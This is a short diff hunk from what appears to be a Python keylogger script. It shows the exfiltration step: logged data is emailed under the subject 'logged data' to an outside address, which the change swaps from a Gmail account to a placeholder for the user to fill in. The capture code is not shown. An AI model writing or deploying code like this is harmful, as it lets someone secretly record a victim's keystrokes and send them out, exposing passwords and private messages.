@@ -42,5 +42,5 @@ if __name__=='__main__':
     
     subject = "logged data"
     body = message
-    to_email = 'test.keylogger34@gmail.com'
+    to_email = 'WRITE THE ADDRESS TO WHICH THE MAILS WILL BE GO'
     send_email(subject, body, to_email)
